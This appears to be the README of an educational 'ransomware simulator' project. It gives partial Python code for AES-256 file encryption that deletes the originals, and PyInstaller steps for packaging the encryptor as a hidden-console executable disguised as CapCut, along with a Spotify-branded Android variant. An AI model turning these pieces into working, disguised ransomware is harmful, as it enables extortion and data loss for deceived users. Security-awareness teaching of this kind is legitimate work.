# **Ransomware Simulator**
## **Summary**
**Ransomware Simulator** is a cross-platform educational project designed to demonstrate the **behavior**, **design**, and **mechanism** of modern ransomware in a controlled and ethical environment.  
The project showcases **real-world ransomware functionalities**, including **targeted file encryption** and **decryption**, while maintaining a clear boundary for **cybersecurity training** and **awareness purposes**.

---

## **Key Components of the Project**

- **Android Ransomware APK (Disguised as Spotify):**  
  Simulates ransomware behavior on Android devices by **encrypting a predefined file** using **AES-256 CBC encryption**.  
  Includes a separate **Decryptor APK** to safely reverse the process using the correct password.

- **Windows Ransomware EXE (Disguised as CapCut):**  
  Provides the same simulation for Windows environments, **encrypting all files within a specific directory** and generating **.encrypted** file extensions.  
  A separate **Decryptor EXE** allows safe restoration.

- **AES-256 CBC Encryption:**  
  Both platforms implement robust **Advanced Encryption Standard (AES)** with **Cipher Block Chaining (CBC)** mode, paired with **SHA-256 for password hashing** to ensure secure simulation.

- **Controlled File Targeting:**  
  Encryption and decryption are **limited to specific folders or files**, minimizing unintended damage and focusing on demonstration.

- **Disguised UI and File Naming:**  
  Real-world mimicry through branding like **Spotify (Android)** and **CapCut (Windows)** to raise awareness about **social engineering tactics** in ransomware attacks.

---

## **Disclaimer**

This simulator is intended strictly for **ethical**, **educational**, and **cybersecurity awareness** purposes, helping **learners**, **researchers**, and **professionals** understand how ransomware operates **without causing real harm**.

# **Architecture Diagram**
## **Windows Ransomware Architecture Diagram**
![Windows Ransomware Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Windos_Arch.jpg)
## **Android Ransomware(Encryptor) Architecture Diagram**
![Android Ransomware(Encryptor) Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Enc_Arch.jpg)
## **Android Ransomware(Decryptor) Architecture Diagram**
![Android Ransomware(Decryptor) Architecture Diagram](./apk%20files%20%20AND%20exe%20Files/Decr_Arch.jpg)
# **CapCut.exe (Windows File Encryptor)**

This component is a Python-based ransomware encryptor disguised as CapCut.exe. It is designed for educational use to demonstrate how ransomware encrypts files using AES-256 encryption. The program encrypts files in a specified folder or a specific file and deletes the original version.

---

## **Overview**

| **Property** | **Details** |
|--------------|--------------|
| **File Name** | CapCut.exe (created from Python script) |
| **Language** | Python |
| **Encryption Type** | AES-256 (CBC Mode) |
| **Password** | "FaizShiv200@123" |
| **Output Extension** | .encrypted |
| **Platform** | Windows |
| **Compiled Using** | PyInstaller |

---

## **How It Works – Step-by-Step**

### **Step 1: Define Target Path**

```python
file_to_encrypt = r"C:\Important_File"  # File or Folder path
```
### **Step 2: Generate AES-256 Key**

A 256-bit encryption key is generated using SHA-256 from the given password:

```python
def get_aes_key(password):
    hasher = SHA256.new(password.encode())
    return hasher.digest()
This ensures consistent and strong encryption.
```
---

### **Step 3: Encrypt File Content**

For each file:
- The file is read.
- Data is padded to fit AES block size.
- A random IV is generated.
- Data is encrypted using AES in CBC mode.
- The IV is added to the beginning of the encrypted file.

```python
iv = Random.new().read(AES.block_size)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted_data = iv + cipher.encrypt(padded_data)
The encrypted file is saved as:
```
The encrypted file is saved as:
###  Step 4: Handle Files and Folders

The program checks if the given path is a file or folder:

- If it's a file ➜ encrypt it.
- If it's a folder ➜ loop through all files inside and encrypt each.

```python
if os.path.isfile(path):
    encrypt_file(path)
elif os.path.isdir(path):
    for root, dirs, files in os.walk(path):
        ...
```

##### **Example**
The input is: C:\Important_File\photo.jpg  

Output after encryption: C:\Important_File\photo.jpg.encrypted\n  

**The original photo.jpg is deleted.**  
###  Convert to .exe using PyInstaller

To turn the script into an .exe named **CapCut.exe**:  
**pyinstaller --onefile --noconsole encryptor.py -n CapCut.exe**  

- `--onefile`: Bundle everything in a single executable.  
- `--noconsole`: Hides the command prompt window.  
- `-n CapCut.exe`: Sets the output file name.  

---

###  Educational Purpose

 This encryptor is strictly for educational use in a controlled environment to understand how ransomware works.

- Demonstrates encryption workflow using AES.
- Shows how files can be programmatically locked and disguised.
- Useful for learning cybersecurity defense techniques.
### Important Notes
This script does not include a decryptor.
Encrypted files cannot be opened without the key.
IV is stored inside the encrypted file itself (at the beginning).

### CapCut Decryptor for Windows — Detailed English Explanation

### Overview

This Python script is used to decrypt files or folders that were previously encrypted using AES-256-CBC encryption (from the CapCut encryptor). The decryption is based on a static password and a proper unpadding mechanism. Later, this script was converted to an executable (decoder.exe) using PyInstaller so that it can be used easily on Windows systems without requiring Python to be installed.

### Tools & Technologies Used

- Python
- PyCryptodome (for AES encryption/decryption)
- PyInstaller (to convert Python script to .exe)
- AES-256 CBC (encryption mode)
- SHA-256 (to generate a secure 256-bit key from the password)

### How It Works (Step-by-Step)

#### 1. Target Selection
```python
file_to_decrypt = r"C:\Important_File"
```
This is the path to the file or folder you want to decrypt.

- It can be a single file or a full folder.
- The script will only process files that have a `.encrypted` extension.

---

### 2. Password & Key Generation

```python
password = "FaizShiv200@123"

def get_aes_key(password):
    hasher = SHA256.new(password.encode())
    return hasher.digest()
```
The password is used to generate a 256-bit AES key using SHA-256 hashing.

- This key must match the one used during encryption.
- The key is used to initialize the AES decryptor.

---

### 3. File Decryption Function

```python
def decrypt_file(file_path):
    ...
```
For each `.encrypted` file:

- Reads the file content.
- Extracts the IV (Initialization Vector) from the first 16 bytes.
- Initializes AES decryptor in CBC mode with the IV and the key.
- Decrypts the remaining data (actual content).
- Calls the `unpad()` function to remove padding.
- Writes the decrypted data to a new file (removes `.encrypted` from the filename).
- Deletes the original encrypted file.

---

### 4. Unpadding Function

```python
def unpad(data):
    padding = data[-1]
    return data[:-padding]
```
- During encryption, padding bytes were added to match AES block size.  
- This function removes that padding after decryption, restoring the original file content.

---

### 5. Process Path Function

```python
def process_path(path):
    ...
```
- If the path is a single file → it attempts to decrypt that file.
- If the path is a directory:
  - It walks through all subfolders and files.
  - Calls `decrypt_file()` for each `.encrypted` file found.

---

### 6. Execution

```python
process_path(file_to_decrypt)
```
This line triggers the full decryption process.

All matching `.encrypted` files are processed.

---

### Conversion to EXE (Optional but Done)

To make it executable on Windows without needing Python installed:

```bash
pyinstaller --onefile --noconsole decoder.py
```
- `--onefile` → Creates a single portable `.exe` file.
- `--noconsole` → Prevents showing a command prompt window during execution.
The final executable:

`decoder.exe` (Disguised as CapCut app)

---

### Summary of Features

| Feature | Description |
|--------|-------------|
| Target | Single file or full folder with `.encrypted` files |
| Algorithm | AES-256 in CBC mode |
| Key Derivation | SHA-256 from static password |
| IV Handling | First 16 bytes of each file |
| File Output | Decrypted file saved with original name |
| Original File Removal | Deletes `.encrypted` file after successful decryption |
| Error Handling | Catches and prints error if decryption fails |
| Final Packaging | Converted to `.exe` using PyInstaller |

